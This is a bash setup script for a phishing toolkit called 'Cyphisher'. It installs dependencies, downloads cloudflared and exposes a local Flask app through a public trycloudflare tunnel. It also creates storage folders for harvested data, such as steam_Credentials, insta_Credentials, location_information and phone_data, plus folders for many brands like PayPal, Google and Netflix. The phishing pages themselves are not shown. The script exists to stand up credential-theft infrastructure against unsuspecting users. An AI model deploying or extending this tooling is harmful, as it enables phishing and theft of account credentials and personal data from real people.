#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script
# Multi-Platform Support
# ===============================


AUTO_CF="${AUTO_CF:-1}"
BACKGROUND="${BACKGROUND:-0}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
CF_DIR="cloud_flare"
CF_BIN=""
CF_LOG="cloudflared.log"
APP_LOG="app.log"
URL_FILE="cloudflared_url.txt"

log(){ printf "\n[setup] %s\n" "$*"; }

detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]' || echo Unknown)"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]' || echo Unknown)"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="android"
    fi

    if [[ "$OS" == *"darwin"* ]] && [[ -d "/Applications" ]] && [[ -d "/System" ]]; then
        OS="darwin"
    fi

    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    case "$ARCH" in
        "x86_64"|"amd64") ARCH="amd64" ;;
        "aarch64"|"arm64") ARCH="arm64" ;;
        "armv7l"|"armv7") ARCH="arm" ;;
        "i386"|"i686") ARCH="386" ;;
    esac

    log "Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

detect_platform

install_pkgs(){
    pkgs="$*"
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y || true
        pkg install -y $pkgs python pip || true
    else
        case "$OS" in
            linux|android)
                if command -v apt >/dev/null 2>&1; then
                    sudo apt update -y || true
                    sudo apt install -y $pkgs python3 python3-pip python3-venv || true
                elif command -v yum >/dev/null 2>&1; then
                    sudo yum update -y || true
                    sudo yum install -y $pkgs python3 python3-pip || true
                elif command -v apk >/dev/null 2>&1; then
                    sudo apk update || true
                    sudo apk add $pkgs python3 py3-pip || true
                else
                    log "Please install $pkgs manually."
                fi
                ;;
            darwin)
                if ! command -v brew >/dev/null 2>&1; then
                    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
                fi
                brew install $pkgs python3 || true
                ;;
            windows)
                if command -v choco >/dev/null 2>&1; then
                    choco install -y $pkgs python3 git
                else
                    log "On Windows, please install Python and Git manually or use Chocolatey"
                fi
                ;;
            *)
                log "Unknown OS; please install: $pkgs"
                ;;
        esac
    fi
}

log "Ensuring git, python3, curl/wget..."
install_pkgs git curl wget unzip || true

find_python() {
    if command -v python3 >/dev/null 2>&1; then
        echo "python3"
    elif command -v python >/dev/null 2>&1; then
        echo "python"
    else
        log "Python not found. Please install Python3."
        exit 1
    fi
}

PYBIN=$(find_python)

if [ ! -d "${VENV_DIR}" ]; then
    log "Creating virtual environment..."
    "$PYBIN" -m venv "${VENV_DIR}"
fi

if [ -f "${VENV_DIR}/bin/activate" ]; then
    . "${VENV_DIR}/bin/activate"
elif [ -f "${VENV_DIR}/Scripts/activate" ]; then
    . "${VENV_DIR}/Scripts/activate"
fi

log "Upgrading pip and installing requirements..."
pip install --upgrade pip setuptools wheel >/dev/null
if [ -f requirements.txt ]; then
    pip install -r requirements.txt
fi

log "Installing required Python packages..."
pip install rich pyfiglet requests flask >/dev/null 2>&1 || true

map_cf_asset(){
    os="$1"
    arch="$2"

    case "$os" in
        linux)
            case "$arch" in
                amd64) echo "cloudflared-linux-amd64" ;;
                arm64) echo "cloudflared-linux-arm64" ;;
                arm) echo "cloudflared-linux-arm" ;;
                386) echo "cloudflared-linux-386" ;;
                *) echo "cloudflared-linux-amd64" ;;
            esac
            ;;
        darwin)
            case "$arch" in
                arm64) echo "cloudflared-darwin-arm64" ;;
                amd64) echo "cloudflared-darwin-amd64" ;;
                *) echo "cloudflared-darwin-amd64" ;;
            esac
            ;;
        windows)
            case "$arch" in
                amd64) echo "cloudflared-windows-amd64.exe" ;;
                arm64) echo "cloudflared-windows-arm64.exe" ;;
                386) echo "cloudflared-windows-386.exe" ;;
                *) echo "cloudflared-windows-amd64.exe" ;;
            esac
            ;;
        android)
            case "$arch" in
                arm64) echo "cloudflared-linux-arm64" ;;
                arm) echo "cloudflared-linux-arm" ;;
                *) echo "cloudflared-linux-arm64" ;;
            esac
            ;;
        *)
            echo "cloudflared-linux-amd64"
            ;;
    esac
}

download_cloudflared() {
    asset="$(map_cf_asset "$OS" "$ARCH")"
    if [ -z "$asset" ]; then
        log "No cloudflared available for this platform"
        return 1
    fi

    url="https://github.com/cloudflare/cloudflared/releases/latest/download/${asset}"
    mkdir -p "$CF_DIR"

    if [ "$OS" = "windows" ]; then
        out="./$CF_DIR/cloudflared.exe"
    else
        out="./$CF_DIR/cloudflared"
    fi

    log "Downloading cloudflared from $url ..."

    if command -v curl >/dev/null 2>&1; then
        if curl -L -f -o "$out" "$url"; then
            chmod +x "$out" 2>/dev/null || true
            echo "$out"
            return 0
        fi
    elif command -v wget >/dev/null 2>&1; then
        if wget -O "$out" "$url"; then
            chmod +x "$out" 2>/dev/null || true
            echo "$out"
            return 0
        fi
    fi

    log "Failed to download cloudflared"
    return 1
}

find_cloudflared(){
    if [ "$OS" = "windows" ]; then
        if [ -f "./$CF_DIR/cloudflared.exe" ]; then
            CF_BIN="$(pwd)/$CF_DIR/cloudflared.exe"
            return 0
        fi
    else
        if [ -f "./$CF_DIR/cloudflared" ]; then
            CF_BIN="$(pwd)/$CF_DIR/cloudflared"
            return 0
        fi
    fi

    if [ "$OS" = "windows" ]; then
        if [ -f "./cloudflared.exe" ]; then
            CF_BIN="$(pwd)/cloudflared.exe"
            return 0
        fi
    else
        if [ -f "./cloudflared" ]; then
            CF_BIN="$(pwd)/cloudflared"
            return 0
        fi
    fi

    if command -v cloudflared >/dev/null 2>&1; then
        CF_BIN="$(command -v cloudflared)"
        return 0
    fi

    CF_BIN=""
    return 1
}

if ! find_cloudflared && [ "${AUTO_CF}" = "1" ]; then
    log "cloudflared not found — attempting download..."
    if downloaded_bin=$(download_cloudflared); then
        CF_BIN="$downloaded_bin"
        log "cloudflared downloaded to $CF_BIN"
    else
        log "cloudflared download failed"
    fi
fi

if find_cloudflared; then
    log "Using cloudflared: $CF_BIN"
else
    log "cloudflared not available. Tunnel will not run."
fi

log "Creating necessary directories..."
mkdir -p steam_Credentials insta_Credentials location_information uploads IG_FOLLOWER \
         Facebook Github Google WordPress Django Netflix Discord Paypal Twitter \
         Yahoo yandex snapchat Roblox adobe LinkedIN Gitlab Ebay Dropbox \
         chatgpt Deepseek collected_data phone_data Twitch Microsoft

export PORT="${PORT}"

run_app_foreground() {
    log "Starting ${APP_FILE} in foreground on port ${PORT}..."

    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
    elif [ -f "${VENV_DIR}/Scripts/python.exe" ]; then
        PYTHON_BIN="${VENV_DIR}/Scripts/python.exe"
    else
        PYTHON_BIN="$PYBIN"
    fi

    exec "$PYTHON_BIN" "${APP_FILE}"
}

run_app_background() {
    log "Starting ${APP_FILE} in background on port ${PORT}..."

    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
    elif [ -f "${VENV_DIR}/Scripts/python.exe" ]; then
        PYTHON_BIN="${VENV_DIR}/Scripts/python.exe"
    else
        PYTHON_BIN="$PYBIN"
    fi

    nohup "$PYTHON_BIN" "${APP_FILE}" > "${APP_LOG}" 2>&1 &
    APP_PID=$!
    log "App started (PID ${APP_PID})"
    sleep 3
    echo "$APP_PID" > "app.pid"
}

run_cloudflared() {
    if [ -n "${CF_BIN}" ]; then
        log "Starting cloudflared tunnel to http://localhost:${PORT}..."

        nohup "${CF_BIN}" tunnel --url "http://localhost:${PORT}" > "${CF_LOG}" 2>&1 &
        CF_PID=$!
        log "cloudflared started (PID ${CF_PID})"
        echo "$CF_PID" > "cf.pid"

        log "Waiting for Cloudflare tunnel to establish..."
        sleep 7

        if [ -f "${CF_LOG}" ]; then
            URL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "${CF_LOG}" | head -1)
            if [ -n "$URL" ]; then
                echo "$URL" > "${URL_FILE}"
                log "Public URL: ${URL} (saved to ${URL_FILE})"
            else
                log "Could not extract URL from cloudflared logs"
            fi
        fi
    else
        log "cloudflared not available - skipping tunnel"
    fi
}

log "Cyphisher setup completed successfully!"
log "Platform: $OS $ARCH"
log "Python: $PYBIN"
log "Virtual Environment: $VENV_DIR"
log "Port: $PORT"

if [ -n "${CF_BIN}" ]; then
    log "Cloudflared: Available ($CF_BIN)"
else
    log "Cloudflared: Not available"
fi

log "Launching Cyphisher main menu..."
sleep 2

clear

if [ "${BACKGROUND}" = "1" ]; then
    run_app_background
    run_cloudflared

    log "Application is running in background."
    log "Check logs: tail -f ${APP_LOG}"
    log "Cloudflared logs: tail -f ${CF_LOG}"

    if [ -f "${URL_FILE}" ]; then
        PUBLIC_URL=$(cat "${URL_FILE}")
        log "Public URL: ${PUBLIC_URL}"
    fi

    log "To stop the application: pkill -f 'python.*main.py' && pkill -f cloudflared"
else
    run_app_foreground
fi